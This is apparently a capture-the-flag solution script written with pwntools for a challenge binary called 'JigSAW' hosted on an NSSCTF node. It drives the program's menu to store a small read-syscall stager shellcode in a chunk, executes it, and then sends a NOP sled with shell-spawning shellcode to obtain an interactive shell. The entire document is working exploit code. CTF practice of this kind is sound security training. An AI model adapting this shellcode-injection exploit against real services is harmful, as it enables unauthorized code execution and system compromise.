from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.anna.nssctf.cn",28444)
# io=process("./JigSAW")
elf=ELF("./JigSAW")

io.recvuntil("Name:\n")
io.sendline(b"1")
io.recvuntil(b"Choice:\n")
io.sendline(str(u64(p32(0)+p32(15))))

def add(n):
    io.sendlineafter(b"Choice : \n",b"1")
    io.sendlineafter(b"Index? : \n",str(n))

def edit(n,cc):
    io.sendlineafter(b"Choice : \n",b"2")
    io.sendlineafter(b"Index? : \n",str(n))
    io.sendafter(b"iNput:\n",cc)
    
def delete(n):
    io.sendlineafter(b"Choice : \n",b"3")
    io.sendlineafter(b"Index? : \n",str(n))

def ex(n):
    io.sendlineafter(b"Choice : \n",b"4")
    io.sendlineafter(b"Index? : \n",str(n))

def show(n):
    io.sendlineafter(b"Choice : \n",b"5")
    io.sendlineafter(b"Index? : \n",str(n))
    
# gdb.attach(io)
# pause()    
    
add(0)

sc_r=asm('''
         xor rdi,rdi
         mov rsi,rdx
         mov rdx,0x100
         syscall
         ''')

edit(0,sc_r)
ex(0)
io.sendline(b"\x90"*0x10+asm(shellcraft.sh()))

io.interactive()